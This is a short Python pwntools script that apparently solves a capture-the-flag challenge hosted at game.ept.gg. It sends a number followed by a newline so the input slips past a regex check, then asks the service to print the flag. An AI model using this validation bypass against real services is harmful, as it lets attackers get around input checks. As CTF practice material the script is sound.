from pwn import *

def exploit():
    conn = remote("game.ept.gg", 1337, ssl=True)
    print(conn.recvuntil(b"> ").decode()) 
        
    # The newline character "escapes" the regex check and will give us one extra point!
    conn.sendline(b"333\n")
    
    # Let Dad do his thing
    print(conn.recvuntil(b"> ").decode()) 
    
    # KO Dad!
    conn.sendline(b"1")

    # Gief flag, plz <3
    print(conn.recvall().decode()) 
    

if __name__ == "__main__":
    exploit()